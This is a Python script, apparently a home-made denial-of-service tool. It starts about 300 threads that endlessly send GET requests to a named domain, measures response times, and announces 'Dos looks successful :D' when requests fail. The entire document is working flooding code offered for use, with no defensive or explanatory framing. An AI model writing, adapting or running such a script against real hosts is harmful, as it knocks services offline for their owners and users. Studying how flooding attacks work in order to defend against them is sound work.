import requests
import threading
import time

l = []

def current_milli_time():
    return round(time.time() * 1000)

def current_sec_time():
    return round(time.time())

def count_req_per_min(time_took):
    t = current_sec_time()
    l.append({
        "time_took": time_took,
        "time_recevied": t
    })

    for e in l:
        if current_sec_time() - e["time_recevied"] >= 1:
            l.remove(e)
    
message = "Dosing...."
def make_request(name):
    while True:
        try:
            s = current_milli_time()
            r = requests.get('https://guruprasanth.selfmade.one')
            t = current_milli_time() - s
            #print(f"response code from thread {name}: {str(r.status_code)}")
            count_req_per_min(t)
        except Exception as e:
            message = "Dos looks successful :D"


threads = 300
i = 0
while i <= threads:
    x = threading.Thread(target=make_request, args=(i,))
    print(f"thread id {i} started...")
    i += 1
    x.start()

print("Calculating ... wait for 5 seconds")
# time.sleep(5)
while True:
    while len(l) > 0:
        time.sleep(1)
        response_time = 0
        for e in l:
            response_time = response_time + e['time_took']
        response_time = response_time / len(l)
        print(f"\rAverage respone time: {round(response_time)}ms, Requests per second: {len(l)} | {message}", end="")
